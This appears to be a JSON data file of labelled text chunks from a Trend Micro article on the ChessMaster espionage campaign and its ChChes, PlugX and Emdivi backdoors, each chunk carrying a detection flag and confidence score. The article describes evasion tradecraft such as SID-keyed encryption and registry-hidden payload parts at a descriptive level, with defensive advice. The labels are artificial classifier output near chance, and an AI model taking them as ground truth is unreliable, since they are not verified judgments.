        "text": "As we caught and delved into more ChChes samples in the wild, however, we also saw how they followed the same pattern\u2014exclusive packers, mutual targets, overlapping C&C infrastructure.\n ChChes\u2019 packer, for instance, resembled the one used in menuPass\u2019 old PlugX samples. DNS records also showed that some of their command and control (C&C) servers and domains resolved to the same IP address, or resided in the same subnet.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5068098902702332
        },
        "prediction": {}
    },
    {
        "text": "Figure 2: Comparison of Emdivi and ChChes\nChessMaster\u2019s ChChes also resembles another backdoor, Emdivi, which first made waves in 2014.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.4959790110588074
        },
        "prediction": {}
    },
    {
        "text": "Both are second-stage payloads that use the system\u2019s Security Identifier (SID) as encryption key so they execute only in their target\u2019s machine. Their difference lies in complexity\u2014ChChes hides part of the decryption key and payload in registry keys to make it harder to reverse engineer.\n",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6301560997962952
        },
        "prediction": {}
    },
    {
        "text": "In one instance, we detected PlugX and Emdivi on the same machine. This PlugX variant connected to an APT 10/menuPass-owned domain, but the packer is similar to that used by ChChes.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5873741507530212
        },
        "prediction": {}
    },
    {
        "text": "While it\u2019s possible it was hit by two different campaigns, further analysis told a different story. Both were compiled on the same date, only several hours apart.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6122022867202759
        },
        "prediction": {}
    },
    {
        "text": "We detected and acquired the samples the next day, which means both backdoors were delivered to the victim a day after they were compiled.\n",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.7119089365005493
        },
        "prediction": {}
    },
    {
        "text": "Figure 3: Overview of the overlaps in ChessMaster and APT 10\u2019s campaigns\nTake \u2018Control of the Center\u2019\n Ultimately attacks like ChessMaster\u2019s make pawns out of the systems, networks, devices and their users, all of which hold the organization\u2019s crown jewels.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6441068649291992
        },
        "prediction": {}
    },
    {
        "text": "This is why enterprises need to be steps ahead of the game: prepare, respond, restore, and learn.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5911515951156616
        },
        "prediction": {}
    },
    {
        "text": "Fine-tune your response\u2014what worked, what didn\u2019t, and what could\u2019ve been done better?\nDefense in depth plays a crucial role especially for the IT/system administrators and information security professionals that watch over them. The network, endpoints, servers, mobile devices, and web/email gateways are the bishops, knights, and rooks that underpin the enterprise\u2019s crown jewels, which is why securing them is important.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5640701651573181
        },
        "prediction": {}
    },
    {
        "text": "Employ behavior monitoring and application control. Deploy firewalls as well intrusion detection and prevention systems. Implement URL categorization, network segmentation, and data categorization.\n",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.4008871912956238
        },
        "prediction": {}
    },
    {
        "text": "ChessMaster\u2019s gambit is spear-phishing, so it\u2019s especially important to filter and safeguard the email gateway.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6506667733192444
        },
        "prediction": {}
    },
    {
        "text": "Additionally, foster a cybersecurity-aware workforce. Seemingly benign icons or decoy documents can still swindle the victim, for instance. More importantly, develop proactive incident response and remediation strategies\u2014threat intelligence helps enterprises prepare and mitigate attacks.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5997310876846313
        },
        "prediction": {}
    },
    {
        "text": "Like in chess, the more you understand your enemy\u2019s moves, the more successful you can be at thwarting them.\n",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6934279203414917
        },
        "prediction": {}
    },
    {
        "text": "The Indicators of Compromise (IoCs) related to ChessMaster's campaigns is in this appendix.\n This has been presented in the RSA Conference 2017 Asia Pacific & Japan as \u201cChessMaster: A New Campaign Targeting Japan Using the New ChChes Backdoor\u201d on July 27, 2017, in Marina Bay Sands, Singapore. Updated on August 14, 2017, 11:50 PM to include IoCs related to ChessMaster.\n\n\n\n\n\n",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5029804706573486
        },
        "prediction": {}
    },
    {
        "text": "Tags\n\nMalware\n|\nEndpoints\n|\nResearch\n\n\n\n\n\n\t\n\t\tAuthors\n\t\n\n\n\n\n\nBenson Sy\nThreats Analyst\n\n\n\n\nKawabata Kohei\nSr. Security Specialist\n\n\n\n\n\n\t\tContact Us\n\t\n\n\n\n\t\tSubscribe\n\t\n\n\n\n\n\n\nRelated Articles\n\n\n\n\t\t\t\t\tDecoding CVE-2023-50164: Unveiling the Apache Struts File Upload Exploit\n\t\t\t\t\n\n\n\n\t\t\t\t\tA Closer Look at ChatGPT's Role in Automated Malware Creation\n\t\t\t\t\n\n\n\n\t\t\t\t\tAttack Signals Possible Return of Genesis Market, Abuses Node.js, and EV Code Signing\n\t\t\t\t\n\n\n\n\n\n\n\t\t\t\tSee all articles\n\t\t\t\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTry our services free for 30 days\n\n\n\n\n\n\n\t\tStart your free trial today\n\t\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nResources\n\nBlog\nNewsroom\nThreat Reports\nDevOps Resource Center\nCISO Resource Center\nFind a Partner\n\n\n\n\n\n\nSupport\n\nBusiness Support Portal\nContact Us\nDownloads\nFree Trials\n\n\n\n\n\n\n\n\nAbout Trend\n\nAbout Us\nCareers\nLocations\nUpcoming Events\nTrust Center\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSelect a country / region\n\n\nUnited States\n\n\t\t\texpand_more\n\n\nclose\n\nThe Americas\n\n\nUnited States\n\n\nBrasil\n\n\nCanada\n\n\nM\u00e9xico\n\n\n\n\nMiddle East & Africa\n\n\nSouth Africa\n\n\nMiddle East and North Africa\n\n\n\n\nEurope\n\n\nBelgi\u00eb (Belgium)\n\n\n\u010cesk\u00e1 Republika\n\n\nDanmark\n\n\nDeutschland, \u00d6sterreich Schweiz\n\n\nEspa\u00f1a\n\n\nFrance\n\n\nIreland\n\n\nItalia\n\n\nNederland\n\n\nNorge (Norway)\n\n\nPolska (Poland)\n\n\nSuomi (Finland)\n\n\nSverige (Sweden)\n\n\n  T\u00fcrkiye (Turkey)\n\n\nUnited Kingdom\n\n\n\n\nAsia & Pacific\n\n\nAustralia\n\n\n\u0426\u0435\u043d\u0442\u0440\u0430\u043b\u044c\u043d\u0430\u044f \u0410\u0437\u0438\u044f (Central Asia)\n\n\nHong Kong (English)\n\n\n\u9999\u6e2f (\u4e2d\u6587) (Hong Kong) \n\n\n\u092d\u093e\u0930\u0924 \u0917\u0923\u0930\u093e\u091c\u094d\u092f (India)\n\n\n  Indonesia\n\n\n\u65e5\u672c (Japan)\n\n\n\ub300\ud55c\ubbfc\uad6d (South Korea)\n\n\nMalaysia\n\n\n\u041c\u043e\u043d\u0433\u043e\u043b\u0438\u044f (Mongolia) and \u0440\u0443\u0437\u0438\u044f (Georgia)\n\n\nNew Zealand\n\n\nPhilippines\n\n\nSingapore\n\n\n\u53f0\u7063 (Taiwan)\n\n\n \u0e1b\u0e23\u0e30\u0e40\u0e17\u0e28\u0e44\u0e17\u0e22 (Thailand)\n\n\n ",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.14567789435386658
        },
        "prediction": {}
    },
    {
        "text": "Vi\u1ec7t Nam\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPrivacy | Legal | Accessibility | Site map\n\n\n\n\n\nCopyright \u00a92023 Trend Micro Incorporated. All rights reserved\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nsXpIBdPeKzI9PC2p0SWMpUSM2NSxWzPyXTMLlbXmYa0R20xk\n\n\n\n\nCliccando su \u201cAccetta tutti i cookie\u201d, l'utente accetta di memorizzare i cookie sul dispositivo per migliorare la navigazione del sito, analizzare l'utilizzo del sito e assistere nelle nostre attivit\u00e0 di marketing.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.22471922636032104
        },
        "prediction": {}
    }
]